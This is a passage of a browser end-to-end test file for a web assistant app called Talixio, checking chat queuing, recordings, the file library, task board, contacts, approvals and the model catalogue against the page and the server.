// The main things a person does in the app, each one checked against the page and the server.
import { execFileSync, spawn } from 'node:child_process';
import { join } from 'node:path';
import { existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
const go = async (page, v) => { await page.evaluate(h => { location.hash = h; }, '#' + v); await page.waitForTimeout(500); };
const api = (page, path) => page.evaluate(p => fetch(p).then(r => r.json()), path);

const flows = {
  async store({ page, check }) {
    await go(page, 'apps');
    await page.waitForSelector('#apps-list .store-box', { timeout: 10000 });
    check('store: Apps shows what the store offers', (await page.textContent('#apps-list .store-box')).includes('The store has no app yet'));
    await page.click('#apps-list [data-ex=tasks]');
    await page.click('#app-to-store');
    await page.waitForSelector('#app-store-note', { timeout: 10000 });
    await page.fill('#app-store-note', 'For the team');
    await page.click('#app-store-form button');
    await page.waitForSelector('#app-store-send :text("Waiting for the admin")', { timeout: 10000 });
    check('store: an app is submitted from its page and waits for the admin', true);
  },
  async chat({ page, check }) {
    await go(page, 'chat');
    await page.fill('#input', 'hello from the browser');
    await page.click('#send');
    await page.waitForSelector('#thread :text("Echo mode")', { timeout: 10000 });
    check('chat: the reply shows', (await page.textContent('#thread')).includes('hello from the browser'));
  },
  async chatQueue({ page, check }) {
    // 1.40.0: what is written while an answer is on its way waits in line, then goes out in order
    await go(page, 'chat');
    let release; const held = new Promise(r => { release = r; }); let first = true;
    await page.route('**/api/chat', async route => { if (first && route.request().method() === 'POST') { first = false; await held; } await route.continue(); });
    const sent = [];
    page.on('request', r => { if (r.url().endsWith('/api/chat') && r.method() === 'POST') sent.push(JSON.parse(r.postData()).text); });
    await page.fill('#input', 'queue one');
    await page.press('#input', 'Enter');
    await page.waitForSelector('#send.stop', { timeout: 6000 });
    check('chat queue: while the answer comes, an empty box offers Stop', await page.getAttribute('#send', 'class').then(c => /stop/.test(c)));
    await page.fill('#input', 'queue two');
    check('chat queue: with something typed, the button sends it after the answer instead', !/stop/.test(await page.getAttribute('#send', 'class')));
    await page.click('#send');
    await page.fill('#input', 'queue three');
    await page.press('#input', 'Enter');
    await page.fill('#input', 'queue four');
    await page.press('#input', 'Enter');
    const items = await page.$$eval('#outbox .ob-t', e => e.map(x => x.textContent));
    check('chat queue: they wait in line, in order, and the box is free again', items.join('|') === 'queue two|queue three|queue four' && (await page.inputValue('#input')) === '', items.join('|'));
    check('chat queue: the line is kept if the page closes', (await page.evaluate(() => JSON.parse(localStorage.getItem(LSK + 'talixio.outbox')).length)) === 3);
    await page.click('#outbox .ob-it:has-text("queue four") [data-ob-edit]');
    check('chat queue: ✎ takes one back into the box', (await page.inputValue('#input')) === 'queue four' && (await page.$$('#outbox .ob-it')).length === 2);
    await page.fill('#input', '');
    await page.click('#outbox .ob-it:has-text("queue three") [data-ob-del]');
    check('chat queue: ✕ cancels one', (await page.$$('#outbox .ob-it')).length === 1);
    release();
    await page.waitForFunction(() => /queue two/.test(document.querySelector('#thread').textContent) && document.querySelector('#outbox').hidden, null, { timeout: 15000 });
    await page.waitForFunction(() => (document.querySelector('#thread').textContent.match(/Echo mode/g) || []).length >= 2 && !document.querySelector('#send.stop'), null, { timeout: 15000 });
    check('chat queue: once the answer ends, the waiting one goes out by itself, one at a time and in order', sent.join('|') === 'queue one|queue two', sent.join('|'));
    await page.unroute('**/api/chat');
  },
  async recordSaved({ page, check }) {
    // 1.41.0: a recording is sent to the server while it is made; an interrupted one is offered back
    const fakeMic = () => page.evaluate(() => {
      navigator.mediaDevices.getUserMedia = async () => {
        const ac = new AudioContext(); const o = ac.createOscillator(); const dst = ac.createMediaStreamDestination();
        o.connect(dst); o.start(); return dst.stream;
      };
    });
    const pieces = n => page.evaluate(async n => { for (let i = 0; i < n; i++) { await new Promise(r => setTimeout(r, 700)); rec.media.requestData(); } }, n);
    await go(page, 'chat');
    await fakeMic();
    await page.click('#mic');
    await page.waitForFunction(() => rec.id && !document.querySelector('#recorder').hidden, null, { timeout: 8000 });
    await pieces(3);
    await page.waitForFunction(() => rec.sent >= 3 && rec.sent === rec.chunks.length, null, { timeout: 8000 });
    const saved = (await api(page, 'api/recordings')).recordings;
    check('recording: each piece is on the server while it records', saved.length === 1 && saved[0].bytes > 0 && saved[0].bytes === await page.evaluate(() => rec.chunks.reduce((n, b) => n + b.size, 0)), JSON.stringify(saved));
    check('recording: it says so', (await page.textContent('#rec-hint')).includes('saved as you go'));
    // the page closes in the middle: what was sent is offered back
    await page.reload(); await page.waitForSelector('#rec-saved:not([hidden]) .rec-saved-it', { timeout: 10000 });
    check('recording: after an interruption it is offered back', (await page.textContent('#rec-saved')).includes('An interrupted recording was saved'));
    const sent = []; const onReq = r => { if (r.url().endsWith('/api/chat') && r.method() === 'POST') sent.push(JSON.parse(r.postData())); };
    page.on('request', onReq);
    await page.click('#rec-saved [data-rs=meeting]');
    await page.waitForFunction(() => document.querySelector('#rec-saved').hidden, null, { timeout: 10000 });
    await page.waitForTimeout(500);
    const lib = sent.length ? JSON.stringify(await api(page, `api/files/${sent[0].files[0]}/text`)) : '';
    check('recording: summarised, it becomes a meeting file sent to the chat', sent.length === 1 && sent[0].meeting === true && sent[0].files?.length === 1 && /meeting-[\d-]+\.webm/.test(lib)
      && (await api(page, 'api/recordings')).recordings.length === 0, JSON.stringify(sent) + lib.slice(0, 300));
    // finished normally: from the pieces already there, not uploaded again
    const urls = []; const onUrl = r => { if (r.method() === 'POST') urls.push(new URL(r.url()).pathname); };
    page.on('request', onUrl);
    await fakeMic(); await page.click('#mic');
    await page.waitForFunction(() => rec.id, null, { timeout: 8000 });
    await pieces(2);
    await page.click('#rec-voice');
    await page.waitForFunction(() => !rec.id && !rec.media, null, { timeout: 10000 });
    await page.waitForTimeout(800);
    check('recording: sent as a voice note from the pieces on the server, not uploaded again', urls.some(u => /\/api\/recordings\/[a-f0-9]+\/finish$/.test(u)) && !urls.includes('/api/files')
      && sent.length === 2 && sent[1].meeting === false, urls.join(' '));
    // cancelled: nothing kept
    await fakeMic(); await page.click('#mic');
    await page.waitForFunction(() => rec.id, null, { timeout: 8000 });
    await pieces(1);
    await page.click('#rec-cancel');
    await page.waitForTimeout(800);
    check('recording: cancelled, nothing is kept on the server', (await api(page, 'api/recordings')).recordings.length === 0 && urls.some(u => /\/discard$/.test(u)));
    page.off('request', onReq); page.off('request', onUrl);
  },
  async capture({ page, check }) {
    for (const [kind, text] of [['task', 'Call Sam about the offer'], ['note', 'Idea for the newsletter']]) {
      await go(page, 'chat');
      await page.click('#capture-btn');
      await page.click(`#capture-dialog [data-kind=${kind}]`);
      await page.fill('#cap-text', text);
      await page.click('#cap-save');
      await page.waitForSelector('#capture-dialog:not([open])', { state: 'attached' });
      const where = kind === 'task' ? (await go(page, 'board'), await page.textContent('#view-board')) : JSON.stringify(await api(page, 'api/library?folder=/Inbox'));
      check(`capture: the ${kind} is saved`, where.includes(text));
    }
  },
  async spaces({ page, check }) {
    await go(page, 'chat');
    await page.click('#space-btn');
    await page.click('#space-menu [data-act=new]');
    await page.waitForSelector('#space-dialog[open]');
    await page.fill('#sp-name', 'Acme');
    await page.fill('#sp-folder', '/Clients/Acme');
    await page.click('#space-form [type=submit]');
    await page.waitForTimeout(800);
    check('spaces: the new space is saved', JSON.stringify(await api(page, 'api/spaces')).includes('Acme'));
  },
  async library({ page, check }) {
    await go(page, 'library');
    await page.click('#lib-add'); await page.click('.row-menu-item >> text=New folder');
    await page.fill('#lib-inline-input', '/Clients/Alex');
    await page.press('#lib-inline-input', 'Enter');
    await page.waitForTimeout(800);
    check('library: the new folder shows', (await page.textContent('#lib-tree')).includes('Alex'));
    await page.evaluate(() => { location.hash = '#library'; }); await page.waitForTimeout(500);
    await page.hover('#lib-list .lib-row');
    await page.click('#lib-list .lib-row .kebab');
    await page.waitForTimeout(200);
    check('library: a row action menu opens', await page.isVisible('.row-menu') && (await page.textContent('.row-menu')).includes('New file here'));
    await page.keyboard.press('Escape');
    await page.click('#lib-add'); await page.click('.row-menu-item >> text=New note');
    await page.waitForTimeout(1000);
    check('library: a new note opens', await page.isVisible('#viewer-body'));
    await page.keyboard.press('Escape');
    await go(page, 'library');
    await page.click('#lib-q'); await page.check('#lib-regex');
    await page.fill('#lib-q', '\\.md$');
    await page.click('#lib-search button[type=submit]');
    await page.waitForTimeout(600);
    check('library: regex name search lists matches with checkboxes', await page.isVisible('#lib-results .rx-pick'));
    await page.click('#lib-results .rx-pick');
    await page.waitForTimeout(150);
    check('library: ticking a match shows the bulk bar', await page.isVisible('#lib-results .bulk-bar:not([hidden])'));
    // a unique file, found by regex, ticked and bulk-deleted: the results must refresh (no stale rows)
    await page.evaluate(async () => { const fd = new FormData(); fd.append('file', new File(['x'], 'rxdelme-unique.md')); fd.append('folder', '/Inbox'); await fetch('api/files', { method: 'POST', headers: { 'X-Talixio': '1' }, body: fd }); });
    await page.fill('#lib-q', 'rxdelme-unique');
    await page.click('#lib-search button[type=submit]');
    await page.waitForTimeout(500);
    check('library: regex finds the unique file', (await page.$$eval('#lib-results .rx-item', e => e.length)) === 1);
    await page.click('#lib-results .rx-pick');
    await page.waitForTimeout(100);
    await page.click('#lib-results .bulk-bar [data-a=del]'); // confirm
    await page.click('#lib-results .bulk-bar [data-a=del]'); // delete
    await page.waitForTimeout(600);
    check('library: after bulk delete the regex results refresh (no stale rows)', (await page.$$eval('#lib-results .rx-item', e => e.length)) === 0);
    await page.fill('#lib-q', '');
    await page.click('#lib-search button[type=submit]'); // empty: closes the search and shows the folder again
    await page.click('#lib-q'); await page.uncheck('#lib-regex');
    await page.waitForTimeout(300);
    await go(page, 'library');
    await page.fill('#lib-q', 'note');
    await page.waitForTimeout(800);
    await page.click('#lib-tree [data-trash]'); await page.waitForTimeout(500); await page.keyboard.press('Escape');
    for (const label of ['Recent changes', 'Shares']) {
      await page.click('#lib-folder-menu'); await page.click('.row-menu-item >> text=' + label); await page.waitForTimeout(500); await page.keyboard.press('Escape');
    }
    check('library: trash, recent and shares open', true);
    await page.setViewportSize({ width: 390, height: 780 }); await page.waitForTimeout(150);
    check('library mobile: toolbar is one + button', await page.isVisible('#lib-add') && !(await page.isVisible('.lib-cols')));
    await page.click('#lib-add'); await page.waitForTimeout(150);
    check('library mobile: the + opens every action', await page.isVisible('.row-menu') && (await page.textContent('.row-menu')).includes('New folder'));
    await page.keyboard.press('Escape');
    await page.setViewportSize({ width: 1280, height: 860 }); await page.waitForTimeout(100);
  },
  async board({ page, check }) {
    await go(page, 'board');
    await page.click('#board-new');
    await page.waitForSelector('#card-dialog[open]');
    await page.fill('#cd-title', 'Send the quote to acme.example');
    await page.click('#card-form [type=submit]');
    await page.waitForTimeout(800);
    check('board: the new card shows', (await page.textContent('#view-board')).includes('Send the quote'));
    await page.fill('#board-q', 'quote'); await page.waitForTimeout(400);
    check('board: the search keeps the card', (await page.textContent('#view-board')).includes('Send the quote'));
    await page.fill('#board-q', ''); await page.waitForTimeout(400);
  },
  async people({ page, check }) {
    await go(page, 'people');
    await page.click('#people-new');
    await page.fill('#person input[name=name]', 'Alex Martin');
    await page.fill('#person input[name=email]', 'alex@acme.example');
    await page.click('#person [type=submit]');
    await page.waitForTimeout(800);
    check('people: the contact is saved', JSON.stringify(await api(page, 'api/contacts')).includes('Alex Martin'));
  },
  async settings({ page, check }) {
    await go(page, 'settings');
    await page.fill('#set-search', 'theme');
    await page.waitForTimeout(400);
    await page.press('#set-search', 'Escape');
    await page.click('.set-sec[data-sec="essentials"] .set-tabs .tab:has-text("Appearance")');
    check('settings: one card per tab', await page.isVisible('#theme-mode') && !(await page.isVisible('#install-card')));
    await page.selectOption('#theme-mode', 'dark');
    await page.waitForTimeout(400);
    check('settings: the dark theme applies', await page.evaluate(() => document.documentElement.outerHTML.includes('dark')));
    await page.selectOption('#theme-mode', '');
    if (await page.isVisible('#doctor-run')) { await page.click('#doctor-run'); await page.waitForTimeout(1500); }
  },
  async routineAllow({ page, check, data, root }) {
    // a routine asked, after reading the web, to add a task: "Always allow for the routine" grants it, its card lists it
    const php = "$a=\\Talixio\\App::fromEnv();$t=$a->store->addTask('Security watch','Check the tracker.','0 11 * * *',time()+3600);"
      + "$a->approvals()->request('board_add',['title'=>'apache2 DSA-6620-1'],'Run board_add: apache2',$t);";
    execFileSync('php', ['-r', "require '" + join(root, 'src/autoload.php') + "';" + php],
      { env: { ...process.env, TALIXIO_DATA_DIR: data, TALIXIO_STORE: join(data, 'store'), TALIXIO_PROVIDER: 'echo', TALIXIO_WEB_PASSWORD: 'pw' } });
    await go(page, 'chat'); await page.reload(); await page.waitForTimeout(800);
    const btn = '#approvals .approval [data-d="always"]';
    await page.waitForSelector(btn, { timeout: 8000 });
    check('routine allow: a routine\'s request offers "Always allow for the routine"', /Security watch/.test(await page.textContent(btn)), await page.textContent(btn));
    await page.click(btn); await page.waitForTimeout(800);
    await go(page, 'tasks'); await page.waitForTimeout(600);
    const card = page.locator('#tasks .task', { hasText: 'Security watch' });
    check('routine allow: the routine\'s card lists what it may do without asking', /Add tasks to the board|Ajouter des tâches/.test(await card.textContent()));
    await card.locator('[data-rm-grant="board_add"]').click(); await page.waitForTimeout(800);
    check('routine allow: ✕ takes it back', (await page.locator('#tasks .task', { hasText: 'Security watch' }).locator('.routine-allow').count()) === 0);
  },
  async approvalNoise({ page, check, data, root }) {
    // 1.35.51: a request is one line with the arguments folded; results approved one after the other make one message
    const php = "$a=\\Talixio\\App::fromEnv();$c=str_repeat(\"echo kernel\\n\",200);"
      + "foreach([1,2] as $n)$a->approvals()->request('board_add',['title'=>\"CVE-$n\",'notes'=>$c],\\Talixio\\Tools::brief('board_add',['title'=>\"CVE-$n\",'notes'=>$c]));";
    execFileSync('php', ['-r', "require '" + join(root, 'src/autoload.php') + "';" + php],
      { env: { ...process.env, TALIXIO_DATA_DIR: data, TALIXIO_STORE: join(data, 'store'), TALIXIO_PROVIDER: 'echo', TALIXIO_WEB_PASSWORD: 'pw' } });
    await go(page, 'chat'); await page.reload(); await page.waitForTimeout(800);
    await page.waitForSelector('#approvals .approval', { timeout: 8000 });
    const first = page.locator('#approvals .approval').first();
    const what = await first.locator('.what').textContent();
    check('approval noise: the request is one line, the long text given as its length', /Run board_add: title "CVE-\d", notes \([\d,]+ characters\)/.test(what) && !/echo kernel/.test(what), what);
    check('approval noise: the arguments are folded under it', (await first.locator('details.what-args').count()) === 1 && !(await first.locator('details.what-args pre').isVisible()));
    await first.locator('details.what-args summary').click();
    check('approval noise: they open on a click', /echo kernel/.test(await first.locator('details.what-args pre').textContent()));
    const before = await page.locator('#thread .jobcard').count();
    for (let i = 0; i < 2; i++) { await page.locator('#approvals .approval [data-d="approve"]').first().click(); await page.waitForTimeout(900); }
    const cards = page.locator('#thread .jobcard');
    check('approval noise: two approvals leave one message in the chat', (await cards.count()) === before + 1 && /2 approved actions|2 actions validées/.test(await cards.last().textContent()), before + ' ' + (await cards.allTextContents()).join(' | ') + ' approvals left: ' + await page.locator('#approvals .approval').count());
    const rows = execFileSync('php', ['-r', "$p=new PDO('sqlite:" + join(data, 'talixio.db') + "');echo json_encode($p->query(\"select content from messages where channel='approval' and content like '%CVE-%'\")->fetchAll(PDO::FETCH_COLUMN));"]).toString();
    check('approval noise: one message is stored for the two', JSON.parse(rows).length === 1, rows.slice(0, 200));
  },
  async crashDumps({ page, check, data }) {
    writeFileSync(join(data, 'core.4242'), 'a crash dump');
    await go(page, 'settings');
    await page.click('#doctor-run');
    await page.waitForSelector('#doctor [data-a="clean-dumps"]', { timeout: 20000 });
    check('doctor: crash dumps are listed with a button to delete them', /crash dump/.test(await page.textContent('#doctor')));
    await page.click('#doctor [data-a="clean-dumps"]'); await page.waitForTimeout(800);
    check('doctor: the button deletes them and says so', !existsSync(join(data, 'core.4242')) && /1 crash dump|1 fichier/.test(await page.textContent('#doctor')), await page.textContent('#doctor'));
  },
  async otherAssistants({ page, check }) {
    await go(page, 'settings');
    await page.evaluate(() => { location.hash = '#settings/assistants'; });
    await page.waitForSelector('#fed-peers', { state: 'visible' });
    check('assistants: the section opens with the pairing card and says nothing is paired', await page.isVisible('#fed-invite') && /No assistant is paired|Aucun assistant/.test(await page.textContent('#fed-peers')));
    await page.click('.set-sec[data-sec="assistants"] .set-tabs .tab:nth-child(2)');
    await page.waitForSelector('#fed-offer', { state: 'visible' });
    check('assistants: the Overview tab shows what I offer and what I follow', /No question offered|Aucune question/.test(await page.textContent('#fed-offer')) && /No assistant is paired|Aucun assistant/.test(await page.textContent('#fed-follow')));
    await page.click('.set-sec[data-sec="assistants"] .set-tabs .tab:nth-child(3)');
    await page.waitForSelector('#fed-preview', { state: 'visible' });
    check('assistants: the exact digest is previewed before anything is shared', (await page.textContent('#fed-preview')).trim().length > 0 && await page.isVisible('#fed-publish'));
    await page.click('.set-sec[data-sec="assistants"] .set-tabs .tab:nth-child(1)');
    await page.click('#fed-have');
    check('assistants: "I have an invitation" opens the form, sharing in return is off by default', await page.isVisible('#fed-have-code') && !(await page.isChecked('#fed-have-digest')));
    await page.fill('#fed-have-code', 'tlx1.not-a-real-invitation');
    await page.click('#fed-have-go');
    await page.waitForFunction(() => /not valid|invalide/i.test(document.querySelector('#toast').textContent));
    check('assistants: an invalid invitation is refused with a plain message', true);
  },
  async modelCockpit({ page, check }) {
    await go(page, 'settings');
    await page.click('#set-nav a[data-sec="model"]');
    await page.waitForSelector('#mb-models .mb-table', { timeout: 10000 });
    const cat = await api(page, 'api/catalogue');
    await page.selectOption('#mb-ftype', 'Forecast');
    await page.waitForSelector('#mb-models .mb-table tbody tr .mname', { timeout: 10000 });
    check('cockpit: TimesFM is a row of the table (type Forecast)', /TimesFM/.test(await page.textContent('#mb-rows')));
    await page.selectOption('#mb-ftype', 'Decision');
    const dec = await page.textContent('#mb-rows');
    check('cockpit: decision models (Jev, Kev, Rizzo Flow) are rows of the table', /Jev/.test(dec) && /Kev/.test(dec) && /Rizzo/.test(dec));
    await page.click('#mb-rows button[data-u="decision"]:not(:disabled)');
    await page.waitForSelector('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', { timeout: 5000 });
    await page.fill('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', 'https://kev.example');
    await page.dispatchEvent('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', 'change');
    await page.waitForTimeout(600);
    check('cockpit: the decision address is saved from the card and the Decisions card shows it is on',
      (await api(page, 'api/settings')).groups.some(g => g.fields.some(f => f.key === 'TALIXIO_DECISION_URL' && f.value === 'https://kev.example')));
    await page.fill('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', '');
    await page.dispatchEvent('#mb-strip input[data-set="TALIXIO_DECISION_URL"]', 'change');
    await page.waitForTimeout(400);
    await page.selectOption('#mb-ftype', '');
    check('cockpit: the catalogue API returns providers and models', (cat.providers?.length || 0) >= 8 && (cat.models?.length || 0) >= 20);
    // Nothing is "connected" in echo mode, so untick Available to see the whole seeded catalogue.
    await page.click('#mb-avail');
    await page.waitForSelector('#mb-models .mb-table tbody tr .mname', { timeout: 10000 });
    const tableText = await page.textContent('#mb-models .mb-table');
    check('cockpit: the Modèles table lists real models from several providers',
      /Haiku|Sonnet|Opus/.test(tableText) && /Mistral|Apertus|Qwen|Llama/.test(tableText));
    // AKI.IO (German sovereign, TL5) is in the catalogue and the provider filter can single it out.
    check('cockpit: AKI.IO is offered as a sovereign (TL5) provider', !!cat.providers.find(p => p.id === 'aki' && p.tl === 5));
    await page.selectOption('#mb-fprov', 'aki');
    await page.waitForTimeout(300);
    const akiRows = await page.$$eval('#mb-models .mb-table tbody tr .tl', els => els.map(e => e.textContent.trim()));
    check('cockpit: the provider filter narrows the table to AKI.IO sovereign models', akiRows.length > 0 && akiRows.every(t => t === '5'));
    await page.selectOption('#mb-fprov', '');
    await page.waitForTimeout(300);
    check('cockpit: a card per usage (fast, standard, deep, voice, images, embeddings, forecast, decisions)', (await page.$$('#mb-usages .ucard')).length === 8);
    check('cockpit: the provider count badge is filled', (await page.textContent('#mb-prov-c')).trim() === String(cat.providers.length));
    // Filter the catalogue down to voice models, then clear it.
    const before = (await page.$$('#mb-models .mb-table tbody tr')).length;
    await page.selectOption('#mb-ftype', 'Voice');
    await page.waitForTimeout(300);
    const voiceRows = await page.$$eval('#mb-models .mb-table tbody tr .ty', els => els.every(e => /voice|voix/i.test(e.textContent)));
    check('cockpit: the type filter narrows the table to one type', voiceRows);
    await page.selectOption('#mb-ftype', '');
    await page.waitForTimeout(300);
    check('cockpit: clearing the filter brings the models back', (await page.$$('#mb-models .mb-table tbody tr')).length === before);
    // Voice, Images and Embeddings are chosen from the table like the chat usages; their cards open what is left to set by hand.
    await page.click('#mb-usages .ucard[data-u="voice"]');
    check('cockpit: the Voice card opens the meeting settings (the model is picked in the table)',
      await page.isVisible('#mb-strip [data-set="TALIXIO_MEETING_TIER"]') && await page.isVisible('#mb-strip [data-set="TALIXIO_VOICE_NOTE_MAX_SECONDS"]'));
    await page.click('#mb-usages .ucard[data-u="embedding"]');
    check('cockpit: the Embeddings card filters the table to embedding models, each with an E button',
      (await page.$$eval('#mb-models .mb-table tbody tr', rs => rs.length > 0 && rs.every(r => /embed|recherche/i.test(r.querySelector('.ty')?.textContent || '')) && rs.filter(r => !r.classList.contains('offrow')).length > 0 && rs.filter(r => !r.classList.contains('offrow')).every(r => !!r.querySelector('button[data-u="embedding"]')))) && await page.isVisible('#mb-strip [data-set="TALIXIO_EMBEDDINGS_DIMS"]'));
    await page.click('#mb-usages .ucard[data-u="vision"]');
    check('cockpit: the Images card shows only models that can read an image, with an I button',
      (await page.$$eval('#mb-models .mb-table tbody tr', rs => rs.length > 0 && rs.every(r => !!r.querySelector('button[data-u="vision"]:not([disabled])') || r.classList.contains('offrow')))) && await page.isVisible('#mb-strip'));
    await page.click('#mb-usages .ucard[data-u="vision"]'); // deselect: back to the full table
    check('cockpit: deselecting the card clears the extra settings', !(await page.isVisible('#mb-strip .mb-strip')));
    // The Europe (GDPR) lock raises the trust floor to level 5.
    await page.click('#mb-lock');
    await page.waitForTimeout(400);
    check('cockpit: the Europe lock sets the trust floor to 5', await page.inputValue('#mb-ftl') === '5');
    const locked = await page.$$eval('#mb-models .mb-table tbody tr:not(.blocked) .tl', els => els.map(e => e.textContent.trim()));
    check('cockpit: under the lock only sovereign/local models remain assignable', locked.every(t => t === '5' || /loc/i.test(t)));
    await page.click('#mb-lock');
    await page.waitForTimeout(300);
    // The Providers tab reveals the provider/account cards; Budget reveals the budget card.
    await page.click('#mb-tabs .mb-tab[data-mtab="providers"]');
    await page.waitForTimeout(300);
    check('cockpit: the Fournisseurs tab shows the provider grid and hides the catalogue, Europe form and brain card',
      await page.isVisible('#mb-pgrid') && !(await page.isVisible('#mb-models')) && !(await page.isVisible('#eu-card')));
    // The Fournisseurs tab leads with a provider-card grid (one card per catalogue provider, plus the add card).
    await page.waitForSelector('#mb-pgrid .mb-pcard', { timeout: 10000 });
    check('cockpit: the Fournisseurs tab leads with a provider-card grid',
      (await page.$$('#mb-pgrid .mb-pcard:not(.add)')).length === cat.providers.length && await page.isVisible('#mb-pcard-add'));
    // A known provider connects inline with just its key — clicking Connect reveals a key field on the card itself.
    await page.click('#mb-pgrid .mb-pcard[data-pid="mistral"] [data-popen]');
    await page.waitForTimeout(200);
    check('cockpit: a provider card connects inline — Connect reveals a key field on the card',
      await page.isVisible('#mb-pgrid .mb-pcard[data-pid="mistral"] .pconnect .pkey'));
    // The add card still opens the advanced custom-provider form (the escape hatch for exotic providers).
    await page.click('#mb-pcard-add');
    await page.waitForTimeout(300);
    check('cockpit: the add-provider card opens the advanced account form', await page.isVisible('#acc-form'));
    await page.click('#mb-tabs .mb-tab[data-mtab="budget"]');
    await page.waitForTimeout(300);
    check('cockpit: the Budget tab shows the budget card', await page.evaluate(() =>
      !!document.querySelector('#view-settings .set-groups[data-groups="model"] .group-card[data-id="budget"]:not([hidden])')));
    await page.click('#mb-tabs .mb-tab[data-mtab="models"]');
    await page.waitForTimeout(200);
    // "Actualiser maintenant" refreshes the catalogue in place (no provider is connected in echo mode, so it stays the seed).
    await page.click('#mb-refresh');
    await page.waitForSelector('#mb-models .mb-table tbody tr .mname', { timeout: 10000 });
    check('cockpit: "Actualiser maintenant" refreshes the catalogue in place', (await page.$$('#mb-models .mb-table tbody tr .mname')).length > 0);
  },
  async libraryExplorer({ page, check }) {
    await page.evaluate(async () => {
      for (const [n, body] of [['b-medium.md', 'x'.repeat(500)], ['a-small.md', 'x'], ['c-large.md', 'x'.repeat(5000)]]) {
        const fd = new FormData(); fd.append('file', new File([body], n)); fd.append('folder', '/Explorer');
        await fetch('api/files', { method: 'POST', headers: { 'X-Talixio': '1' }, body: fd });
      }
    });
    await page.evaluate(() => { for (const k of Object.keys(localStorage)) if (k.endsWith('talixio.lib.sort')) localStorage.removeItem(k); });
    await page.evaluate(() => { location.hash = '#library/Explorer'; }); await page.waitForTimeout(900);
    const names = () => page.$$eval('#lib-list .lib-row[data-id] .name b', e => e.map(x => x.textContent));
    check('explorer: files are listed by name', JSON.stringify(await names()) === JSON.stringify(['a-small.md', 'b-medium.md', 'c-large.md']));
    check('explorer: the page above the list is one slim toolbar (< 70 px)', (await page.evaluate(() => document.querySelector('#lib-list').getBoundingClientRect().top - document.querySelector('#view-library').getBoundingClientRect().top)) < 130);
    await page.click('.lib-cols [data-sort=size]'); await page.waitForTimeout(150);
    check('explorer: a click on Size sorts by size', JSON.stringify(await names()) === JSON.stringify(['a-small.md', 'b-medium.md', 'c-large.md']));
    await page.click('.lib-cols [data-sort=size]'); await page.waitForTimeout(150);
    check('explorer: a second click reverses the order', JSON.stringify(await names()) === JSON.stringify(['c-large.md', 'b-medium.md', 'a-small.md']) && (await page.getAttribute('.lib-cols [data-sort=size]', 'aria-sort')) === 'descending');
    await page.reload(); await page.waitForTimeout(900);
    check('explorer: the sort is remembered', (await page.getAttribute('.lib-cols [data-sort=size]', 'aria-sort')) === 'descending');
    await page.click('.lib-cols [data-sort=name]'); await page.waitForTimeout(150);
    await page.hover('#lib-list .lib-row[data-id]');
    await page.check('#lib-list .lib-row[data-id] .pick');
    check('explorer: ticking a file replaces the toolbar with the selection bar', await page.isVisible('#lib-selbar') && !(await page.isVisible('#lib-toolbar')) && (await page.textContent('#lib-sel-n')).includes('1'));
    await page.click('#lib-list .lib-row[data-id]:nth-of-type(4) .name', { modifiers: ['Shift'] });
    await page.waitForTimeout(150);
    check('explorer: Shift-click selects the range', (await page.textContent('#lib-sel-n')).includes('3'));
    check('explorer: the zip link carries the selected ids', /ids=\d+,\d+,\d+/.test(await page.getAttribute('#lib-sel-zip', 'href')));
    await page.click('#lib-sel-clear'); await page.waitForTimeout(100);
    check('explorer: clearing brings the toolbar back', await page.isVisible('#lib-toolbar') && !(await page.isVisible('#lib-selbar')));
    await page.click('#lib-list .lib-row[data-id]', { modifiers: ['Control'] });
    await page.click('#lib-sel-del'); await page.waitForTimeout(100);
    check('explorer: delete asks for a second click', await page.isVisible('.lib-confirm'));
    await page.click('.lib-confirm [data-y]'); await page.waitForTimeout(800);
    check('explorer: the selection is deleted', (await names()).length === 2);
    await page.click('#lib-view-btn'); await page.waitForTimeout(150);
    check('explorer: the View panel opens with sort, group and filters', await page.isVisible('.lib-pop') && (await page.textContent('.lib-pop')).includes('Text and notes'));
    await page.click('.lib-pop [data-kind=image]'); await page.waitForTimeout(150);
    check('explorer: a filter shows its chip, the count, and an empty message', await page.isVisible('.lib-chip') && (await page.textContent('#lib-view-n')) === '1' && (await names()).length === 0 && (await page.textContent('#lib-list')).includes('No file matches'));
    await page.click('.lib-pop [data-kind=text]'); await page.waitForTimeout(150);
    check('explorer: another type brings the files back', (await names()).length === 2);
    await page.click('.lib-pop [data-group=kind]'); await page.waitForTimeout(150);
    check('explorer: grouping by type adds a header', await page.isVisible('#lib-list .lib-group'));
    await page.click('.lib-pop [data-clear]'); await page.click('.lib-pop [data-group=""]'); await page.waitForTimeout(150);
    check('explorer: clearing removes the chip and the groups', !(await page.isVisible('.lib-chip')) && !(await page.isVisible('#lib-list .lib-group')));
    await page.keyboard.press('Escape');
    await page.click('.lib-views [data-view=tiles]'); await page.waitForTimeout(150);
    check('explorer: Tiles view lays the files out as a grid without a column header',
      await page.evaluate(() => getComputedStyle(document.querySelector('#lib-list')).display === 'grid') && !(await page.isVisible('.lib-cols')) && (await page.$$('#lib-list .lib-row[data-id]')).length === 2);
    await page.click('.lib-views [data-view=list]'); await page.waitForTimeout(150);
    check('explorer: Compact list view hides Type and By', !(await page.isVisible('#lib-list .c-by')) && (await page.$$('#lib-list .lib-row[data-id]')).length === 2);
    await page.reload(); await page.waitForTimeout(900);
    check('explorer: the layout is remembered', await page.evaluate(() => document.querySelector('.lib-views [data-view=list]').classList.contains('on')));
    await page.click('.lib-views [data-view=details]'); await page.waitForTimeout(150);
    check('explorer: Details brings the column header back', await page.isVisible('.lib-cols'));
    // slice 4: tree toggle, up/back, context menu, keyboard
    check('explorer: the folder tree is shown on a wide screen', await page.isVisible('#lib-tree'));
    await page.click('#lib-tree-btn'); await page.waitForTimeout(100);
    check('explorer: the tree toggle hides the tree', !(await page.isVisible('#lib-tree')));
    await page.click('#lib-tree-btn'); await page.waitForTimeout(100);
    check('explorer: and brings it back', await page.isVisible('#lib-tree'));
    check('explorer: Up is enabled in a sub-folder', await page.isEnabled('#lib-up'));
    await page.click('#lib-up'); await page.waitForTimeout(700);
    check('explorer: Up goes to the parent folder', (await page.evaluate(() => location.hash)) === '#library' && !(await page.isEnabled('#lib-up')));
    check('explorer: Back is enabled after navigating', await page.isEnabled('#lib-back'));
    await page.click('#lib-back'); await page.waitForTimeout(700);
    check('explorer: Back returns to the folder', (await page.evaluate(() => location.hash)).startsWith('#library/Explorer'));
